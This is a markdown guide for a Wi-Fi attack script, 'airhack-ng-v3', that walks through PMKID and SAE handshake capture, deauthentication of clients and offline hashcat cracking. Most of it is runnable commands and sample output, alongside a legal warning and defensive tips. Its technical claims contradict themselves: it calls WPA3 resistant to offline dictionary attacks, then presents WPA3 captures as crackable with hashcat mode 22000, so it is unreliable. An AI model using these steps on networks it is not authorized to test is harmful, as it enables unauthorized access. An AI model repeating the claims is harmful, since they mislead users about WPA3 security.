# WPA3 Attack Guide

Complete guide for testing WPA3 networks with airhack-ng-v3.

## 🔐 WPA3 Overview

**WPA3** (Wi-Fi Protected Access 3) is the latest WiFi security standard, designed to address vulnerabilities in WPA2.

### Key Differences from WPA2

| Feature | WPA2 | WPA3 |
|---------|------|------|
| **Authentication** | 4-way handshake | SAE (Dragonfly) |
| **Forward Secrecy** | No | Yes |
| **Offline Dictionary** | Vulnerable | Resistant |
| **Brute Force Protection** | Weak | Strong |
| **Minimum Key Length** | 8 characters | 8 characters |

### WPA3 Security Features

- ✅ **SAE (Simultaneous Authentication of Equals)** - Replaces PSK
- ✅ **Forward Secrecy** - Past sessions can't be decrypted
- ✅ **Brute Force Protection** - Rate limiting built-in
- ✅ **Stronger Encryption** - 192-bit security for WPA3-Enterprise

## ⚠️ Legal Warning

**WPA3 testing requires explicit authorization.**

Only test on:
- Your own networks
- Networks with written permission
- Authorized penetration testing engagements
- Lab environments

## 🛠️ Required Tools

### Core Tools (Included in install_dependencies.sh)

```bash
sudo apt install hcxdumptool hcxtools hashcat
```

**Tool Descriptions:**
- **hcxdumptool** - Captures PMKID and handshakes
- **hcxtools** - Converts captures to hashcat format
- **hashcat** - GPU-accelerated password cracking

### Check Installation

```bash
which hcxdumptool hcxpcapngtool hashcat
```

## 🎯 Attack Methods

### Method 1: PMKID Attack (Clientless) ⚡

**Advantages:**
- ✅ No connected clients needed
- ✅ Faster than handshake capture
- ✅ Works on many WPA2/WPA3 routers
- ✅ One PMKID packet is enough

**How it works:**
1. Monitor mode enabled
2. Send association request to AP
3. AP responds with PMKID in EAPOL frame
4. Extract PMKID hash
5. Crack hash offline with hashcat

**Usage:**

```bash
# 1. Enable monitor mode
sudo ./airhack-ng-v3 -a wlan0 -em

# 2. Save target configuration
sudo ./airhack-ng-v3 -e "TargetWPA3" -a wlan0 -c 6 -b AA:BB:CC:DD:EE:FF -g --save

# 3. Capture PMKID (runs for 2 minutes)
sudo ./airhack-ng-v3 -e "TargetWPA3" -i -7

# 4. Crack the hash
sudo ./airhack-ng-v3 -e "TargetWPA3" -i -4 --dict wordlists/rockyou.txt
```

**What happens:**
- Script uses `hcxdumptool` to capture PMKID
- Automatically converts to hashcat format (`.hash` file)
- Uses hashcat mode 22000 for cracking

### Method 2: WPA3-SAE Handshake Capture

**When to use:**
- PMKID attack failed
- Testing WPA3-only networks
- Need SAE handshake for analysis

**Requirements:**
- Connected client OR
- Wait for natural authentication

**Usage:**

```bash
# 1. Start capture (in separate window with -k flag)
sudo ./airhack-ng-v3 -e "TargetWPA3" -i -k -8

# Capture runs until you stop it (Ctrl+C)
# If client MAC is known, deauth will be sent to force reconnection

# 2. Crack captured handshake
sudo ./airhack-ng-v3 -e "TargetWPA3" -i -4 --dict wordlists/rockyou.txt
```

**What happens:**
- Captures WPA3-SAE authentication
- Converts to hashcat format if `hcxtools` available
- Falls back to `aircrack-ng` if conversion fails

## 📊 Attack Comparison

| Method | Speed | Client Required | Success Rate |
|--------|-------|-----------------|--------------|
| **PMKID (-7)** | ⚡ Fast (2 min) | ❌ No | 🟢 High |
| **SAE Handshake (-8)** | 🐌 Slow (varies) | ✅ Yes | 🟡 Medium |
| **Dictionary (-4)** | 💪 Depends on GPU | N/A | 🟡 Depends on password |

## 🎓 Step-by-Step Example

### Complete WPA3 PMKID Attack

```bash
# Step 1: Install tools (one time)
sudo ./install_dependencies.sh
# Select "Y" for WPA3 tools

# Step 2: Download wordlist
./download_wordlists.sh
# Select option 1 (rockyou.txt)

# Step 3: Check system
./check-system.sh

# Step 4: Scan for WPA3 networks
sudo ./airhack-ng-v3 -a wlan0 -em
sudo ./airhack-ng-v3 -a wlan0 --scan

# Look for networks with "WPA3" in encryption column
# Note the BSSID, Channel, and ESSID

# Step 5: Configure target
sudo ./airhack-ng-v3 \
  -e "MyWPA3Network" \
  -a wlan0 \
  -c 6 \
  -b 00:11:22:33:44:55 \
  -g \
  --save

# Step 6: Capture PMKID (2 minutes)
sudo ./airhack-ng-v3 -e "MyWPA3Network" -i -7

# You'll see:
# [*] Starting WPA3 PMKID attack (clientless)
# [✓] This attack works WITHOUT connected clients!
# [*] Capturing for 2 minutes...

# Step 7: Check if PMKID was captured
ls -lh ~/airhack-ng/MyWPA3Network-pmkid.*

# You should see:
# MyWPA3Network-pmkid.pcapng  (capture file)
# MyWPA3Network-pmkid.hash    (hashcat format)

# Step 8: Crack the hash
sudo ./airhack-ng-v3 -e "MyWPA3Network" -i -4 --dict wordlists/rockyou.txt

# hashcat will run:
# Session.........: hashcat
# Status..........: Running
# Hash.Mode.......: 22000 (WPA-PMKID-PBKDF2)
# Time.Started.....: [timestamp]
# Speed.#1........:   123456 H/s

# If password is found:
# [✓] Password found: YourWiFiPassword123
```

## 🔬 Manual hashcat Commands

If you want more control:

### Extract PMKID manually

```bash
hcxpcapngtool -o output.hash ~/airhack-ng/Network-pmkid.pcapng
```

### Crack with hashcat

```bash
# Basic dictionary attack
hashcat -m 22000 output.hash wordlist.txt

# With rules (try password variations)
hashcat -m 22000 output.hash wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack (known pattern)
hashcat -m 22000 output.hash -a 3 ?d?d?d?d?d?d?d?d  # 8 digits

# Combination attack
hashcat -m 22000 output.hash -a 1 wordlist1.txt wordlist2.txt

# Show cracked passwords
hashcat -m 22000 output.hash --show
```

### GPU Acceleration

```bash
# Check GPU status
hashcat -I

# Use specific GPU
hashcat -m 22000 output.hash wordlist.txt -d 1

# Workload tuning (1=low, 2=default, 3=high, 4=nightmare)
hashcat -m 22000 output.hash wordlist.txt -w 3
```

## 🛡️ WPA3 Defenses

### Why Some WPA3 Networks Resist Attacks

1. **Strong Passwords** - 15+ random characters
2. **Patched Firmware** - Dragonblood vulnerabilities fixed
3. **SAE Groups** - Using secure elliptic curves
4. **Management Frame Protection** - Enabled

### Best Practices for WPA3 Security

**For Network Administrators:**
- ✅ Use 20+ character random passwords
- ✅ Enable WPA3-only mode (disable WPA2)
- ✅ Keep firmware updated
- ✅ Enable Management Frame Protection (802.11w)
- ✅ Use WPA3-Enterprise for business networks
- ✅ Monitor for authentication attempts

**For Users:**
- ✅ Use password managers for WiFi passwords
- ✅ Avoid dictionary words
- ✅ Use passphrases: "correct horse battery staple"
- ✅ Update router firmware regularly

## 🐛 Troubleshooting

### No PMKID Captured

**Symptoms:**
```
[!] No PMKID found. Target may not be vulnerable.
```

**Solutions:**
1. **Check if target is WPA3:**
   - Some routers don't support PMKID
   - Try WPA3 handshake capture instead

2. **Get closer to AP:**
   - Weak signal = no response
   - Use `airodump-ng` to check signal strength

3. **Try different network:**
   - Not all WPA3 routers are vulnerable to PMKID

4. **Check hcxdumptool version:**
   ```bash
   hcxdumptool --version
   ```
   - Update if older than 6.2.0

### hcxdumptool Not Found

**Error:**
```
[!] hcxdumptool not found, trying legacy method...
```

**Solution:**
```bash
sudo apt update
sudo apt install hcxdumptool hcxtools
```

**Alternative (build from source):**
```bash
git clone https://github.com/ZerBea/hcxdumptool.git
cd hcxdumptool
make
sudo make install
```

### hashcat Too Slow

**Problem:** CPU cracking is very slow

**Solutions:**

1. **Use GPU:**
   ```bash
   # Install GPU drivers
   sudo apt install nvidia-driver-525  # For NVIDIA
   sudo apt install mesa-opencl-icd    # For AMD

   # Verify GPU detected
   hashcat -I
   ```

2. **Use smaller wordlist:**
   ```bash
   # Top 10k passwords
   sudo ./airhack-ng-v3 -e "Network" -i -4 --dict wordlists/top-10000.txt
   ```

3. **Cloud GPU:**
   - Use AWS/GCP GPU instances
   - Google Colab (free GPU)
   - HashKiller.io (online service)

### Permission Denied

**Error:**
```
NETLINK: Package Socket: Operation not permitted
```

**Solution:**
```bash
# Always use sudo for capture
sudo ./airhack-ng-v3 -e "Network" -i -7
```

## 📈 Success Rates

**Based on password complexity:**

| Password Type | PMKID Success | Time to Crack |
|---------------|---------------|---------------|
| **8 digits** | 🟢 High | Minutes |
| **Common words** | 🟢 High | Hours |
| **Name+Year** | 🟡 Medium | Days |
| **12+ random** | 🔴 Low | Years+ |
| **20+ random** | 🔴 Very Low | Centuries |

## 🎯 Real-World Scenarios

### Scenario 1: Home Router Assessment

**Objective:** Test your home WPA3 router

```bash
# Quick PMKID test
sudo ./airhack-ng-v3 -a wlan0 -em --scan
sudo ./airhack-ng-v3 -e "HomeWiFi" -a wlan0 -c 6 -b XX:XX:XX:XX:XX:XX -g --save -7
sudo ./airhack-ng-v3 -e "HomeWiFi" -i -4 --dict wordlists/common-1m.txt

# If password found in top 1M: CHANGE IT!
```

### Scenario 2: Penetration Test

**Objective:** Audit client's WiFi security

```bash
# Document everything
# Get written authorization first!

# Comprehensive test
sudo ./airhack-ng-v3 -a wlan0 --scan > wifi_scan_results.txt
sudo ./airhack-ng-v3 -e "ClientWiFi" -a wlan0 -c X -b XX:XX:XX:XX:XX:XX -g --save

# Try PMKID first (non-intrusive)
sudo ./airhack-ng-v3 -e "ClientWiFi" -i -7

# If PMKID fails, try handshake (requires deauth - document!)
sudo ./airhack-ng-v3 -e "ClientWiFi" -i -s CLIENT_MAC -k -8

# Report findings
# - Time to capture: X minutes
# - Attack method used: PMKID/Handshake
# - Password complexity: Weak/Medium/Strong
# - Recommendations: [list]
```

## 🔗 Resources

### Tools Documentation
- **hcxdumptool:** https://github.com/ZerBea/hcxdumptool
- **hcxtools:** https://github.com/ZerBea/hcxtools
- **hashcat:** https://hashcat.net/wiki/

### WPA3 Security Research
- Dragonblood Attacks: https://wpa3.mathyvanhoef.com/
- WPA3 Specification: https://www.wi-fi.org/discover-wi-fi/security

### Learning Resources
- WiFi Hacking Course: https://www.udemy.com/topic/wifi-hacking/
- Hashcat Tutorial: https://hashcat.net/wiki/doku.php?id=tutorial

---

**Remember: Only test networks you own or have authorization to test!**

WPA3 is significantly more secure than WPA2. Even with these attacks, strong passwords remain very difficult to crack.
